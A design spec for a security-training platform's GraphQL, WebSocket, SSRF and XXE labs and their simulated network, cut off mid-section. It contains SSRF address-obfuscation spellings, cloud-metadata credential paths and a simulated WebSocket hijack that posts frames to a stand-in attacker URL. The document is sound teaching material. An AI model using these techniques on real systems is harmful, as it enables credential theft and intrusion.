# HVWA Phase 3 — Archive API (AR-01…15) & Scriptorium (SC-12…20): engine + per-level design

> **Status: DESIGN (to become binding after controller/owner review).** This is the architect spec for Phase 3. It was
> written against master `c002043`, the plan (`docs/superpowers/plans/2026-11-15-hvwa.md`), both Phase 2 designs and all
> their amendments, `docs/RECIPES.md` §1–§13, and the in-flight branches `engine-e1` (3c37b3f: SameSite jar,
> `crossSitePost` / `corsFetch` / `frame`, attacker-page presets) and `engine-e4` (eaffc27: QuickJS SSTI sandbox, RECIPES
> §14). I made no changes to the repo. My probes are in `scratchpad/phase3-design/scripts/`.
>
> The design covers **24 labs**: AR-01…AR-15 (new district `archive-api`) and SC-12…SC-20 (district `scriptorium`).
> It also covers the cross-cutting engine they need. Every engine task has its own spec-review gate, like D0 and E0–E4.

Conventions follow `docs/RECIPES.md` and the Phase 2 designs:

- Each lab is a five-file folder (`challenge.ts`, `model.ts`, `levels/*.ts`, `views/*.ejs`, `<id>.spec.ts`).
- Render only through `sendPage`. Issue flags only through `flagFor` (or `issueFlag(ID, sid, level)` inside a
  `perSession` factory, as SC-11 does). Keep per-player state only in `perSession`.
- The title, summary and three hints (cost 10/20/40) are bilingual. They contain no payloads.
- Each level has one distinct flaw, so step-up (matrix case g) holds. Divine resists every exploit and never issues a
  flag.
- Lab content is English.
- **The binding Phase 2 amendments carry over unchanged:**
  - SC-12 does not repeat SC-11's double encoding.
  - The XXE labs teach DTDs on the **server** parser and never send the player's DTD through the XSS oracle.
  - Execution is **simulated only**: no `eval`, `vm`, `child_process` or `include` in the host realm, ever.

---

## 0. What Phase 3 forces the engine to grow

Phase 2's engine lacks five capabilities. All five are added in-process, deterministically, and with no real network.
This follows the `core/sim` and `simFs` precedent.

| Capability | New code | Labs that depend on it |
|---|---|---|
| **GraphQL**: parse, validate, execute, introspection, batching, static cost | `core/graphql/` (on `graphql@16.14.2`, with one quadratic rule replaced; see A1) | AR-01 … AR-06 |
| **WebSocket**: the real RFC 6455 endpoint, an HTTP fallback transport, and the simulated cross-site socket | `core/ws/` (hand-rolled, text frames only) + `core/sim/socket.ts` + `AttackerStep` kind `socket` | AR-14, AR-15 |
| **Simulated network**: DNS with TTL cache and rebinding, IP ground truth, server-side `fetch`, fake IMDS, the player's own server and DNS zone | `core/sim/{ip,dns,net,imds}.ts` (pure, under the existing no-network guard) | SC-16 … SC-19, AR-10, AR-13; SC-14/15 (out-of-band XXE) |
| **XML with DTDs** (server side): entities, parameter entities, external DTD, XInclude, billion-laughs bounds | `core/xmldtd/` (pure; resolver injected: `file:` → simFs, `http(s):` → simNet) | SC-14, SC-15 |
| **Deserialization in the sandbox**: a node-serialize-compatible `unserialize` running inside QuickJS with E4's fake Node | `core/ssti/serialized.ts` (an E4 extension) | SC-20 |

Labs that need **no** new engine:

- AR-07, AR-08, AR-09, AR-11 and AR-12 are REST/JSON on `perSession`.
- SC-12 runs on `simFs`.
- SC-13 runs on `simFs` plus a 20-line `simInclude` beside `simInterpret`.

**New runtime dependencies proposed:** one, `graphql@16.14.2` (Q1). It was published 2026-06-09, is 2.1 MB unpacked
(2.9 MB on disk measured) and has zero dependencies. The hand-rolled fallback is fully specified in case Q1 is refused.

**Other proposals:**

- **WebSocket:** no `ws` dependency (Q2).
- **Compose:** no new compose service (Q4). The P0-SEC plan note that "mock services are added as compose services" is
  superseded by in-process simulation, matching every owner decision so far.
- **nginx:** no change. `docker/proxy/nginx.conf` already forwards `Upgrade`/`Connection` with `proxy_http_version 1.1`
  and a `$connection_upgrade` map (verified).
- **Platform security headers:** no change.

---

## A. Engine design — the hard decisions

### A1. GraphQL (AR-01 … AR-06)

**What the labs need.**

- Queries, mutations, aliases, named and inline fragments, and variables.
- `@include`/`@skip`.
- Introspection that real tools accept: GraphiQL, Altair, InQL, graphql-voyager and clairvoyance all send graphql-js's
  `getIntrospectionQuery()`.
- Field suggestions ("Did you mean …?"), as a level toggle.
- JSON array batching.
- An interface (`Node`) with inline fragments on it.
- A custom `JSON` scalar.
- A **static cost model** for the DoS labs, so a "million objects" query is judged without building a million
  objects. This works like RM-12's arithmetic cost.

Everything must be bounded and deterministic.

**Options.**

- **(i) `graphql@16.14.2` as is.** This is the reference implementation, with exact error texts and tool-compatible
  introspection.
  - Size: 2.1 MB unpacked, zero dependencies.
  - **Measured on this box** (Node 22.22, `scripts/gql-bench.mjs`): parse is linear (18 KB in 7.5 ms), but
    **validation is quadratic in one rule**, `OverlappingFieldsCanBeMergedRule`:
    - 300 same-key fields with differing arguments: 315 ms.
    - 1000 such fields: **3.5 s** of blocked event loop (18 KB of query).
    - 100 fragments × 20 aliases: 847 ms.
  - `parse(source, { maxTokens })` caps tokens, but a cap low enough to fix validation (≈1000 tokens) starves AR-03/04,
    which need a few hundred aliases.
  - Suggestions cannot be switched off in 16.x. Apollo strips them from messages.
- **(ii) Hand-rolled subset** (`core/graphql/`): lexer, parser, validator subset, sync executor and introspection.
  - About 1,400 lines plus tests.
  - Linear by construction.
  - Fidelity is the risk. The introspection shape must match graphql-js's byte-for-byte expectations of tools, and the
    error texts must match too.
- **(iii) Hybrid: graphql-js with the quadratic rule swapped out** for a linear one of ours. Measured
  (`scripts/gql-bench2.mjs`), validation with `specifiedRules` minus `OverlappingFieldsCanBeMergedRule` takes:
  - 500 same-key fields with differing arguments: **7.4 ms** (was 635 ms);
  - 100 × 20 fragments: **13.2 ms** (was 514 ms);
  - 1500 aliases: 6.4 ms.

  The replacement `LinearFieldMergeRule` keeps a `Map<responseKey, firstFieldSignature>` per selection set (fragments
  expanded once each, memoised) and reports the same message graphql-js does ("Fields "a" conflict because they have
  differing arguments. Use different aliases on the fields to fetch both if this was intended."). It compares each
  occurrence with the **first** one, not every pair. That is O(fields), and still rejects every document the spec
  rejects for differing name or arguments. It does not detect conflicts that only appear deep inside merged
  sub-selections (an accepted, documented gap: such documents simply execute with the first occurrence's arguments).

**Recommendation: (iii), graphql-js 16.14.2 with the linear merge rule**, behind a `core/graphql/` boundary that
owns every bound. If the owner refuses the dependency (Q1), (ii) implements the **same** `core/graphql` API, so no lab
changes. Introspection fidelity is worth one zero-dependency package: players will point real tools at these labs. A
hand-rolled introspection that InQL rejects teaches nothing.

**`core/graphql/` (engine task E7):**

```ts
// core/graphql/limits.ts
export const GRAPHQL_LIMITS = Object.freeze({
  bodyBytes: 32 * 1024,        // route-local express.json({ limit }) on /graphql
  sourceChars: 16 * 1024,      // one document
  tokens: 4000,                // parse(source, { maxTokens })
  nesting: 64,                 // pre-scan: max depth of { [ ( outside strings/comments, BEFORE parse (graphql-js parses recursively)
  batch: 200,                  // most operations in one JSON array (a level may allow fewer, or 0 = refuse arrays)
  variablesChars: 8 * 1024,    // JSON.stringify(variables)
  resolverCalls: 3000,         // real resolver calls per HTTP request; beyond it fields resolve to null, extensions.truncated = true
  listItems: 25,               // a resolver never returns more items than this (the lab's "real" materialisation)
  responseChars: 128 * 1024,   // serialised response; beyond it: one error "Response too large (platform bound)"
  errors: 50,                  // errors listed (the rest counted)
  costCap: 1e15,               // virtualCost saturates here (shown as ">= 10^15")
});
```

- `prescan(source)`: a linear index scan that checks `sourceChars` and `nesting` before `parse`. It skips string,
  block-string and comment contents. Over a cap, it answers `400 { errors: [{ message: 'Query too large/too deeply
  nested (platform bound)' }] }`.
- `makeSchema(sdl, resolvers)` builds the schema with `buildSchema(sdl)` and attaches `resolve` functions from a plain
  map (`{ Query: { scroll: fn }, Scroll: { author: fn } }`). Lab resolvers are synchronous; a Promise is a lab bug and
  the request fails with 500.
- `graphqlHttp(req, opts)` → `{ status, body }` is the transport.
  - Input:
    - one `{ query, variables, operationName }` object, or an array (batching, allowed when `policy.batching > 0`);
    - `GET ?query=&variables=` for queries only.
  - Order of steps:
    1. `policy.textFilter?.(query)` runs on raw text. This is a level WAF.
    2. prescan.
    3. `parse(maxTokens)`.
    4. `validate(schema, doc, [...specifiedRulesMinusOverlap, LinearFieldMergeRule, ...(policy.introspection ? [] :
       [NoSchemaIntrospectionCustomRule]), ...policy.rules])`.
    5. `policy.costBudget` against `virtualCost`.
    6. `executeSync` with a counting `fieldResolver` wrapper.
  - Responses follow graphql-over-http: 400 for parse and validation failures, 200 otherwise.
  - Suggestions: when `policy.suggestions === false`, every message has its `Did you mean …?` tail removed (as Apollo
    does).
  - At Divine, resolver errors are masked to `Internal server error.` (the `tryDb` rule). Below Divine, the real message
    is shown.
- `virtualCost(doc, schema, model, variables)` is the **simulated** work: the number of objects the real server would
  load.
  - It walks the operation with fragments expanded, memoised per fragment.
  - Each list field multiplies by `model.listSize(field, args)`, for example `args.first ?? 10`.
  - Each field adds `model.fieldCost(field)`, default 1, or 500 for AR-04's `render`.
  - The cost is linear in the document size, because a fragment's cost is computed once and scaled.
  - It returns a JS number capped at `costCap`.
  - DoS labs judge the flag on this number, never on real work. That is RM-12's pattern ("the real server would have
    built N rows").
- `walkFields(doc, visit, { expandFragments })` is a tiny visitor over the AST (field, depth, alias, path). Level files
  use it to write their own (flawed or correct) counters, the way GK-13's level files install their own guards.
- `policy` per level, from the level file:
  ```ts
  { introspection: boolean, suggestions: boolean, batching: number,
    textFilter?: (query: string) => { ok: true; text: string } | { ok: false; status: number; message: string },
    rules?: readonly ValidationRule[], costBudget?: number }
  ```
- Bounds as measured: the worst document under the caps validates in ≤ 15 ms (fragments 100 × 20 at 13 ms), and
  execution is capped at 3000 resolver calls. The guard spec must keep a "stays linear" case: 4000 tokens of same-key
  conflicting fields validates in under 50 ms.
- No GraphiQL. Vendoring it needs React and is not offline-small. Each GraphQL lab page has a **query console**: one
  textarea holding the raw JSON request body, posting back to the lab, run through the same `graphqlHttp`, with the
  result shown escaped in a `<pre>`. A body that is a JSON array is a batch. The page also shows curl lines and
  says "point your own client (Altair, InQL, Burp) at `<lab>/graphql`".
- **Conformance oracle** (not runtime): `tests/graphql-conformance.spec.ts` runs a corpus (≈60 documents: aliases,
  fragments, variables, coercion errors, introspection) through `graphqlHttp` and through plain graphql-js `graphql()`,
  and asserts equal `data` and equal error messages. The only exceptions are the merge-rule cases, which are pinned
  separately. Under option (ii), graphql-js stays as a **devDependency** for exactly this spec (Q1b).

### A2. WebSocket (AR-14, AR-15)

**Options.**

- **(i) `ws@8.22.0`.** 154 KB, zero dependencies, published 2026-09-26. It is mature, but its history includes DoS
  CVEs (CVE-2024-37890, header flood). It would run as `new WebSocketServer({ noServer: true, maxPayload,
  perMessageDeflate: false })`.
- **(ii) Hand-rolled minimal RFC 6455 server** (`core/ws/frames.ts` and `server.ts`, about 350 lines). Text frames only,
  no extensions, and strict caps. It follows HVWA's precedent of hand-rolled parsers (the ZIP reader).

**Recommendation: (ii), hand-rolled**, with `ws` as the fallback if review finds the framing code too risky (Q2). The
needed subset is small and fully specified below. A strict text-only server has a smaller attack surface than a
general library, and nothing in the lesson lives in the framing.

**Measured** (`scripts/ws-probe.mjs`):

- Node 22.22's **global `WebSocket`** (undici) completes a handshake against a 40-line `upgrade` handler in 29 ms.
- It accepts `{ headers: { cookie } }` and sends **no Origin** by default.
- It offers `permessage-deflate`, which we simply do not accept.

So tests and players' Node scripts need no client dependency either.

**Frames (`core/ws/frames.ts`, pure):**

- `FrameReader` is incremental (bytes in, events out).
- Client frames **must** be masked; an unmasked frame closes with 1002.
- RSV bits must be zero (1002).
- Opcodes:
  - text (1) and continuation (0) are accepted;
  - binary (2) closes with 1003;
  - close (8), ping (9) and pong (10) are control frames: they must carry ≤ 125 bytes and be unfragmented (1002
    otherwise).
- Payload limits (`WS_LIMITS`):
  - one frame ≤ 16 KiB;
  - one message after continuation ≤ 16 KiB, else 1009;
  - a 64-bit length above the cap closes before any allocation.
- Text is validated as UTF-8 with `TextDecoder('utf-8', { fatal: true })` on the whole message, else 1007.
- `encodeFrame(opcode, payload)` builds server frames, which are unmasked.

**Mounting (`core/ws/server.ts`): one `upgrade` listener on the HTTP server.** Express middleware never runs for upgrade
requests, so the platform rules are re-applied explicitly:

1. **Host guard.** `host-guard.ts` exports `hostAllowed(req, allowed)` (refactored out of the middleware, same
   rules). A refusal writes `HTTP/1.1 421` with `MISDIRECTED_BODY` and destroys the socket. A duplicate Host gets 400.
2. **Route.** Look the canonical path up, lower-cased, in the socket table that `mountChallenges` filled from
   `defineChallenge({ socket })`. A miss gets 404.
3. **Handshake.** Require:
   - `GET`;
   - `Upgrade: websocket` (token, case-insensitive);
   - `Connection` containing `upgrade`;
   - `Sec-WebSocket-Version: 13` (else 426 with `Sec-WebSocket-Version: 13`);
   - a `Sec-WebSocket-Key` that is 16 bytes of base64 (else 400).

   Offered extensions are ignored, so none are negotiated. Subprotocols are not supported.
4. **Platform Origin guard (new, real sockets only).** If `Origin` is present, its host must be a loopback name or an
   `HVWA_ALLOWED_HOSTS` name (any port); otherwise 403.
   - This stops a real website the player visits from opening a socket into their lab (real CSWSH against the
     player's own machine).
   - A missing Origin (wscat, websocat, Node) is allowed.
   - The **lab's** Origin lesson is played on the **simulated** handshake (A2, sim). This is exactly how GK-09 keeps the
     raw `Host` out of the lesson. The rule goes into SECURITY.md.
5. **Session.** Read `hvwa_sid` from the Cookie header, which must be a UUID. Upgrades **never mint** a session: a
   missing one gets 401 "Open the lab page first; it sets your session cookie".
6. **Level.** Take `?level=`, else the `hvwa_level` cookie, else the default; then `clampLevel` to the challenge's
   levels.
7. **Caps.** At most 32 open sockets process-wide (503 with `Retry-After: 5`) and 4 per `hvwa_sid` (429).
8. **The lab decides.** Call `app.accept(handshake)`. `{ ok: false, status, text }` writes that status. `{ ok: true,
   open }` writes `101` with `Sec-WebSocket-Accept`, then runs `open(conn)`.

**Per-connection bounds:**

- 20 messages a second (token bucket); beyond it, close 1008 "rate".
- The outgoing queue stays ≤ 256 KiB (`socket.writableLength`), else close 1008.
- The server pings every 30 s; with no pong within 30 s, the socket closes.
- Idle connections close after 120 s, and every connection closes after 30 min.
- All timers use an injectable clock and timer seam (`attachSockets(server, app, { clock })`).
- Errors close the socket. They never throw into the server.

**Where it hooks in:**

- `createApp()` puts `app.locals.upgrade` (the bound handler) on the app.
- `lifecycle.listen()` calls `server.on('upgrade', app.locals.upgrade)`.
- `tests/helpers.ts serve(app)` does the same.
- No Express change, no global middleware change.

**The lab's socket app is a twin** (`core/ws/app.ts`, pure). One object answers the real socket, the HTTP fallback and
the simulated victim:

```ts
export interface SocketHandshake {
  readonly level: Level; readonly sessionId: string;            // whose lab (perSession key)
  readonly path: string; readonly query: URLSearchParams;
  readonly headers: Readonly<Record<string, string>>;           // lower-case
  readonly cookies: Readonly<Record<string, string>>;           // the lab's own cookies, decoded
  readonly origin?: string;                                     // the Origin header as sent ('null' included)
  readonly self: string;                                        // the app's own origin: http://<Host> for real, CITADEL_ORIGIN in the sim
}
export interface SocketConn { send(text: string): void; close(code?: number, reason?: string): void }
export interface SocketSession { message(text: string, conn: SocketConn): void; closed?(): void }
export type SocketAccept = { readonly ok: true; open(conn: SocketConn): SocketSession }
                         | { readonly ok: false; readonly status: number; readonly text: string };
export interface SocketApp { accept(h: SocketHandshake): SocketAccept }   // synchronous, like SimHandler
// defineChallenge({ socket: { path: '/ws', app: (h: Pick<SocketHandshake,'sessionId'|'level'>) => SocketApp } })
```

- **`self`** lets one level function judge Origin in both worlds. For example, Templar's flawed
  `origin.includes(new URL(h.self).hostname)` sees `127.0.0.1` for the player's real browser and `citadel.test` for the
  simulated admin.
- **HTTP fallback transport** (`core/ws/fallback.ts`).
  - `mountChallenges` mounts `POST <lab>/ws/frames` for every socket lab. It takes the JSON body
    `{ "frames": ["…"] }`, with at most 10 frames of at most 4 KiB each.
  - It builds a `SocketHandshake` from the HTTP request, with the same Origin guard and the same cookies, and runs
    accept → open → each frame → close.
  - It answers `{ accepted: true, received: [...] }`, or the refusal status with `{ accepted: false, text }`.
  - It is a Socket.IO-style polling transport. It lets curl users play, and it lets `describeExploitMatrix` (supertest)
    drive socket labs. Every socket lab also has one real-WebSocket integration spec using Node's global `WebSocket`
    against `serve(app)`.
  - It sends no CORS headers, so a cross-site page cannot read it.
- **Players** can use:
  - devtools: `new WebSocket('ws://127.0.0.1:1337/d/archive-api/<slug>/ws?level=acolyte')`;
  - `websocat`, `wscat`, Burp's WebSocket tools;
  - the lab page's own small console, a lab-authored script served from `<lab>/client.js` (`application/javascript`,
    no player bytes);
  - the fallback form.

**CSWSH in the simulation (engine task E8, on top of E1).**

- `core/sim/socket.ts` adds `SimBrowser.crossSiteSocket(url, { page?, send? })`, and `core/victim.ts` adds an
  `AttackerStep` kind `{ kind: 'socket'; url: string; send?: readonly string[] }`. `visitAttackerPageAction` runs it,
  following E1's pattern: the attacker page is declared, never parsed or run.
- The rules, as Chrome applies them:
  - **URL.** `ws:`/`wss:` (or `http:`/`https:`, which the WebSocket constructor now maps) is classified by
    `classifySimUrl` after the scheme mapping. A fragment means `invalid`, as the constructor throws `SyntaxError`.
    Only the citadel answers; anything else is `unreachable`.
  - **Handshake.** A GET that always carries `Origin`: the page's origin, or `null` from a sandboxed frame. It carries
    `Sec-Fetch-Site: cross-site`, `Sec-Fetch-Mode: websocket` and `Sec-Fetch-Dest: websocket`.
  - **Cookies.** These are those of a **cross-site subresource**: only `SameSite=None; Secure` cookies are sent, while
    Lax and Strict are withheld (E1's jar).
  - **Redirects.** None are followed; a 3xx fails the handshake (`refused`).
- **Reading.** WebSockets have **no** same-origin read protection. Once accepted, the page sends its `send` frames in
  order and **receives every server frame** (≤ 20, each clipped to 2000 chars). It forwards each one home:
  `POST ATTACKER_EXFIL_URL` with the frame as the body lands in the attacker log. That is the CSWSH proof, the analogue
  of `corsFetch`'s readable verdict.
- `world.browser(handler, { socket?: SimSocketHandler })`: the sim has its own minimal socket types, because
  `core/sim/` must not import `core/ws/`. `core/ws/app.ts` exports `toSimSocket(appFor)` to adapt a `SocketApp`, with
  `self = CITADEL_ORIGIN`.
- `SimSocketVisit = { outcome: 'opened' | 'refused' | 'unreachable' | 'invalid'; status?; received: readonly string[];
  sent: number }`, frozen, with every string a copy (RECIPES §8).
- The browser's weight is unchanged: the received frames are clipped into the attacker log, which is already weighed.

### A3. SSRF: the simulated network (SC-16 … SC-19, AR-10, AR-13; XXE out-of-band)

**Options.**

- **(i) Compose mock services**, as the old P0-SEC note suggested: `metadata`, an internal admin container, a DNS
  server for rebinding and an attacker container, all on the internal `lab` network, with the app making **real**
  outbound requests.
  - Cost: four more services, each with a memory footprint, inside a 512 MB stack.
  - Labs stop working under `npm start` and in tests without Docker.
  - Rebinding needs a real authoritative DNS the app's resolver queries. That is impossible without changing the app
    container's resolver.
  - Results are nondeterministic (timing, DNS caching in glibc).
  - The attacker log needs a back channel into the app.
  - It also introduces the app's **first real outbound socket code**, which is exactly what the no-egress design exists
    to make unnecessary.
- **(ii) In-process `simNet`**, pure, under the existing `core/sim/` no-network guard. A per-player simulated network
  with DNS, routing, services and an attacker server. The lab's level code calls `net.lookup` and `net.fetch` exactly
  as real code calls `dns.lookup` and `fetch`.

**Recommendation: (ii).** It matches every owner decision so far (sim victim, simFs, QuickJS-in-process), keeps `npm
test` hermetic, and makes rebinding deterministic. It adds zero compose services (Q4).

**Files** (engine task E5): `core/sim/ip.ts`, `core/sim/dns.ts`, `core/sim/net.ts`, `core/sim/imds.ts`, re-exported from
`core/sim.ts`. They import only each other, `core/sim/limits.ts`, `core/sim/url.ts`, `core/sim/world.ts` and
`core/lab.ts`, plus the WHATWG `URL` global (already used by `classifySimUrl`). The guard in `tests/sim.spec.ts` extends
to them unchanged: no socket, no DNS, no fetch; spies on `net`, `dns`, `http(s)`, `tls` and `dgram` during whole
fetches. Random tokens (IMDS) come from an injected `newToken()`, which the engine side supplies with
`randomBytes(32).toString('base64url')`, so `core/sim` stays crypto-free.

**IP ground truth (`ip.ts`).**

- `hostAddress(hostname)` takes a WHATWG-parsed hostname, which the URL parser has already canonicalised, and returns
  the address or undefined for a name. Measured (`scripts/url-probe.mjs`):

  | Spelling | Canonical form |
  |---|---|
  | `2852039166`, `0xa9fea9fe`, `0251.0376.0251.0376`, `169.254.43518` | `169.254.169.254` |
  | `127.1`, `0x7f.1`, `017700000001`, `①②⑦.0.0.1`, `１２７.０.０.１`, `%31%32%37.0.0.1` | `127.0.0.1` |
  | `0` | `0.0.0.0` |
  | `[::ffff:169.254.169.254]` | `[::ffff:a9fe:a9fe]` |
  | `[::127.0.0.1]` | `[::7f00:1]` |

- `parseAddress(text)` takes canonical IPv4/IPv6 text (zone values, `pin`) and returns `{ family, text, bytes }`.
- `routeOf(addr)` is **where a connection really goes**, as Linux does it:
  - `::ffff:a.b.c.d` → that IPv4 address.
  - `127.0.0.0/8`, `::1`, `0.0.0.0/8` and `::` → loopback (Linux connects `0.0.0.0` and `::` to the local host).
  - IPv4-compatible `::a.b.c.d` (deprecated) → **not** IPv4, so unroutable.
  - NAT64 `64:ff9b::/96` → unroutable (the lab has no NAT64 gateway).
- `isPublicAddress(addr)` is the Divine-grade check. Its comment lists every range.
  - **Denied IPv4:** `0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`, `172.16/12`, `192.0.0/24`, `192.168/16`,
    `198.18/15`, `224/4`, `240/4`.
  - **Denied IPv6:** `::/128`, `::1`, `::/96`, `::ffff:0:0/96` (unmapped, then checked as IPv4), `64:ff9b::/96`,
    `100::/64`, `2001:db8::/32`, `fc00::/7`, `fe80::/10`, `ff00::/8`.
  - **HVWA's simulated internet** is the three TEST-NETs: `192.0.2/24`, `198.51.100/24` and `203.0.113/24`. They count
    as **public** here (documented), so the attacker's server and the scroll CDN stay reachable at Divine.
  - Level files never import `isPublicAddress` below Divine. Their (flawed) checks are written in the level file,
    where View Source shows them.

**DNS (`dns.ts`).**

- **Fixed zone** (TTL 300):

  | Name | Addresses |
  |---|---|
  | `citadel.test` | `203.0.113.10` (the lab's public face) |
  | `attacker.test` and every `*.attacker.test` **without a player record** | `198.51.100.66` (the player's server) |
  | `localhost` | `127.0.0.1`, `::1` |
  | `metadata.citadel.internal` | `169.254.169.254`, `fd00:ec2::254` |

  Labs add names with `simNet({ hosts })`: `scrolls.citadel.test` 203.0.113.20, `admin.citadel.internal` 10.0.0.5,
  `api.opencodex.test` 192.0.2.40. Anything else is `ENOTFOUND`.
- **The player's zone** (`net.zone`), edited through the panel (engine route `POST <lab>/sim/dns`):
  - At most 6 records `{ name, type: 'A' | 'AAAA', first, then?, ttl }`.
  - The name must be `<1–4 labels>.attacker.test`, labels `[a-z0-9-]{1,63}`. The values may be any canonical IP of
    the record's family (private ones are the point). `ttl` is 0–3600, default 60.
  - **`then` makes a rebinding record:** the record's first authoritative query answers `first`, every later query
    answers `then`.
  - Saving a record resets its query counter. Records are listed on the panel, escaped.
- **The resolver** (`net.lookup(name)`) is the OS stub resolver the app uses.
  - It caches answers for their TTL on the **world clock** (≤ 32 names; TTL 0 is never cached).
  - The cache key is the lower-cased name without one trailing dot.
  - Every query that reaches the **player's** zone (a cache miss for a `*.attacker.test` name) is logged in the attacker
    log as `DNS dns:<name>?type=A|AAAA`, the Burp Collaborator analogue.
  - It returns `{ ok: true, addresses, ttl, cached } | { ok: false, code: 'ENOTFOUND' }`, with addresses in record
    order (A records first, then AAAA, as Node's `verbatim` order gives them).

**Fetch (`net.fetch(url, init)`)** is the ground-truth HTTP client, behaving as undici's `fetch` does.

1. Parse with WHATWG. A bad URL is `TypeError: Invalid URL`.
2. Only `http:` and `https:` are allowed. Anything else is `TypeError: fetch failed (unsupported scheme "file:")`.
   https carries no TLS model.
3. Resolve the host: an IP literal is used as is (`hostAddress`). A name goes through `net.lookup`, unless the call
   passes `init.pin`, a canonical address the **first hop** connects to. That is a custom `lookup` / pinned agent, and
   the `Host` header is still the URL's host.
4. Connect. Try the addresses in order, via `routeOf`, until one has a listener on that port:
   - **Loopback** routes to the lab's loopback services, which listen on every loopback address and on `0.0.0.0`/`::`.
   - `169.254.169.254` and `fd00:ec2::254`, port 80, route to the fake **IMDS** (`imds.ts`).
   - `198.51.100.66`, **any port**, routes to the **player's server**. The request is logged: method, URL, up to 8
     headers, body ≤ 2 KiB, `from: 'server'`. The answer is the player's configured route for that path, else
     `200 text/plain ok`.
   - Any other lab service is answered at its `(address, port)`.
   - A private address with no listener is `connect ECONNREFUSED <ip>:<port>`.
   - A public or unroutable address with no listener is `connect ETIMEDOUT <ip>:<port> (the lab has no route to the
     internet)`. It is simulated: no time passes.
5. The request carries:
   - `host`, `user-agent: ScriptoriumFetcher/1.0` (labs may override), `accept: */*`;
   - `content-type` when there is a body;
   - the caller's `init.headers`. Names must be tokens and values free of CR, LF and NUL, else `TypeError: Headers:
     invalid header`; there are at most 16, each value ≤ 1 KiB.
   - A body (string, ≤ 4 KiB) only for POST, PUT and PATCH.
6. The response is `{ status, headers (lower-case), body }`, with the body clipped to 16 KiB.
7. Redirects:
   - `redirect: 'follow'` (the default) follows 301, 302, 303, 307 and 308, up to 5 hops, else
     `TypeError: redirect count exceeded`.
     - 303, and 301/302 after a POST, become GET without a body. 307 and 308 keep the method and body.
     - Each hop **re-resolves** through `net.lookup` (pin applies to hop 1 only), with **no** checks, exactly like undici.
   - `'manual'` returns the 3xx to the caller. Level files that re-check hops write their own loop, so View Source
     shows it.
8. **Bounds.**
   - `net.beginAction()` (called by the engine before a lab action, and by lab routes before their fetch work) resets a
     counter. At most 8 requests per action across all `fetch` calls; beyond it, `TypeError: too many requests (platform
     bound)`.
   - The last 3 traces are kept. Each trace has ≤ 8 hops `{ url, address, port, status | error }`, URLs clipped to 2048.

It returns `{ ok: true, status, headers, body, url, hops } | { ok: false, error, hops }`.

**The player's server** (`net.server`, engine route `POST <lab>/sim/server`):

- At most 5 routes `{ path (exact pathname, ≤ 200), status ∈ {200, 301, 302, 303, 307, 308, 404, 500}, contentType
  (≤ 100), location? (≤ 2048, required for 3xx), body (≤ 4 KiB) }`.
- It serves **only** server-side fetches. The victim browser model is unchanged: nothing ever comes back from
  attacker.test to a simulated browser, so D0 and E1 keep their invariants.

**The fake IMDS (`imds.ts`).**

- IMDS-compatible paths and headers. The provider is the fictional "Citadel Cloud", named so on every page (Q5).
- **Modes:** `'v1'` (token optional) and `'v2-required'`.
- **Token:** `PUT /latest/api/token` with `x-aws-ec2-metadata-token-ttl-seconds: 1..21600` returns a token (text). A
  missing or invalid TTL is 400. A PUT carrying `x-forwarded-for` is 403, as real IMDSv2 refuses proxied token
  requests. Tokens: at most 4, expiring on the world clock.
- **Token use on GET:** a valid `x-aws-ec2-metadata-token` is accepted. An invalid one is 401. A missing one is 401 in
  `v2-required` mode and accepted in `v1` mode.
- **Paths:**
  - `/latest/meta-data/` lists `ami-id hostname iam/ instance-id local-ipv4 placement/`.
  - `/latest/meta-data/instance-id` is `i-0c17ade1f5a9b3d2e`. `/latest/meta-data/local-ipv4` is `10.0.0.20`.
  - `/latest/meta-data/iam/` lists `info security-credentials/`.
  - `/latest/meta-data/iam/security-credentials/` gives the role name.
  - `/latest/meta-data/iam/security-credentials/<role>` gives JSON
    `{ Code: 'Success', LastUpdated, Type: 'AWS-HMAC', AccessKeyId: 'ASIACITADEL…', SecretAccessKey: <secret()>, Token,
    Expiration }`.
  - Anything else is 404. Methods other than GET and PUT are 405.
- The lab passes `secret: () => …` (the flag below Divine; `'(sealed)'` at Divine), read lazily.

**Weights.**

- A `simNet` caps its holder like a sim store: `SIMNET_LIMITS.weight` is **256 KiB**, to be measured with a full GC
  (zone, cache, routes with 4 KiB bodies, 3 traces), with ≤ 30 new instances a minute.
- It requires a `simWorld` for the attacker log and the clock.
- SSRF labs never need the inbox, so E5 adds `simWorld({ inbox: false })`, which skips the 576 KiB inbox. The panel then
  hides the mailbox. An SSRF instance is about 1 MiB; a world + simNet + simFs (XXE) instance is about 1.4 MiB.

**Panel and engine routes.**

- `VictimConfig` gains `net?: (req) => SimNet`, and `actions` may be **empty** when `net` is given.
- `mountVictim` then mounts, before the lab's routes (the `/sim/` prefix becomes reserved like `/victim/`; `mountIntents`
  refuses it):
  - `POST <lab>/sim/dns` (save one record), `POST <lab>/sim/dns/clear`,
  - `POST <lab>/sim/server` (save one route), `POST <lab>/sim/server/clear`.

  Each answers 303 back to the lab.
- The panel adds:
  - "Your DNS (attacker.test)": the records, and a form.
  - "Your server (attacker.test) serves": the routes, and a form.
  - "What the server's fetcher did": the last 3 traces, as hops (URL, address:port, status or error). These are the
    player's own requests and redirect targets, never response bodies.
  - The attacker log, now with server hits (`from the Archive's server`) and DNS queries.
- The attacker log type grows `from?: 'browser' | 'server' | 'dns'` and `headers?` (server hits only). Its weight
  (`attackerLogWeight`) is re-measured, and `attackerHits()` in `tests/helpers.ts` reads the new fields.

### A4. XXE: the server's XML parser (SC-14 DOCX, SC-15 SVG)

**Shared with `core/xss/xml.ts`? No.**

- That reader builds parse5 tree nodes for the browser oracle and **refuses** DTDs (`limited: 'dtd'`). This one models
  a **server** parser (libxml2-like) that expands DTDs on purpose, under a sandboxed resolver.
- They differ in output (a small DOM vs parse5 nodes), error model (fail-fast with libxml2 messages vs Chrome's partial
  documents) and purpose.
- Sharing the code would couple the E0 oracle, which has an import guard and pinned Chrome rows, to an intentionally
  permissive parser.
- The ≈30 lines of XML character-class tables are **copied**, with a spec asserting both copies agree on every BMP code
  unit. That keeps the E0 import guard untouched (Q7).

**`core/xmldtd/` (engine task E6), pure:**

- **Imports:** `node:buffer`, `core/sim/limits.ts` (copying `clip`) and type-only imports. A guard spec like the upload
  guard checks this (no fs, network, vm or child_process; spies during a whole parse).
- **Entry point:** `parseXml(text, opts) → XmlDoc`, synchronous, throwing `XmlError` with a libxml2-style message plus
  `line:column`. A lab wraps it as `tryDb(req, () => parseXml(…), 'Parser error')`.
- **Supported syntax:**
